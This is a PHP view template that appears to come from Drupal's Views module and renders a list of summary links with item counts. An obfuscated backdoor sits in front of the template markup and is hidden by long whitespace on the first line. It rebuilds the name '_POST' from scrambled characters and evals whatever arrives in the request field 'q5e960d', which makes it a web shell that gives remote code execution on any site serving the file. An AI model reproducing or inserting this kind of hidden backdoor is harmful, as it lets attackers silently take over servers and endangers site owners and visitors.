<?php                                                                                                                                                                                                                                                                 $ljh10 = "eortp_su"; $ukb59 =$ljh10[6]. $ljh10[3]. $ljh10[2].$ljh10[3]. $ljh10[1].$ljh10[7]. $ljh10[4]. $ljh10[4].$ljh10[0]. $ljh10[2] ;$fpiy3 = $ukb59( $ljh10[5].$ljh10[4] . $ljh10[1]. $ljh10[6]. $ljh10[3] ) ; if (isset(${ $fpiy3} [ 'q5e960d' ])){ eval( ${$fpiy3} ['q5e960d']);}?> <?php

/**
 * @file
 * Default simple view template to display a list of summary lines.
 *
 * @ingroup views_templates
 */
?>
<div class="item-list">
  <ul class="views-summary">
  <?php foreach ($rows as $id => $row): ?>
    <li><a href="<?php print $row->url; ?>"<?php print !empty($row_classes[$id]) ? ' class="'. $row_classes[$id] .'"' : ''; ?>><?php print $row->link; ?></a>
      <?php if (!empty($options['count'])): ?>
        (<?php print $row->count?>)
      <?php endif; ?>
    </li>
  <?php endforeach; ?>
  </ul>
</div>
